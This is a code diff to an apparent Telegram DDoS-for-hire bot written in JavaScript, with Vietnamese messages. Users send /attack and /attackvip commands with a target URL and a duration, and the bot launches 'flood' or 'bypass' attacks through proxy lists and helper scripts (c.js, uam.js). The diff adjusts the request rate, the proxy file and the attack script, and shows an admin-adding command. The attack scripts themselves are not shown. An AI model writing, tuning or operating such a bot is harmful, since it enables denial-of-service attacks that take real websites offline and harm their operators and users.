@@ -39,7 +39,7 @@ bot.onText(/\/attack (https?:\/\/[^\s]+) (\d+)/, (msg, match) => {
     lastUserAttackTime[userId] = now;
   }
 
-  const rate = '504';
+  const rate = '54';
   const thread = '9';
   const proxy = '7.txt';
   const method = 'flood';
@@ -77,8 +77,8 @@ bot.onText(/\/attackvip (https?:\/\/[^\s]+) (\d+) (flood|bypass)/, (msg, match) 
 
   const rate = '80';
   const thread = '5';
-  const proxy = '8.txt';
-  const scriptPath = path.join(__dirname, 'c.js');
+  const proxy = '7.txt';
+  const scriptPath = path.join(__dirname, 'uam.js');
 
   bot.sendMessage(chatId, `✨ VIP Attack bat đau vao ${url} | Method: ${method} | Time: ${duration}s`);
 
@@ -125,6 +125,7 @@ bot.onText(/\/add (\d+)/, (msg, match) => {
   ADMIN_IDS.push(newAdminId);
   bot.sendMessage(chatId, `✅ Đa them admin moi voi ID: ${newAdminId}`);
 });
+
 
 
 
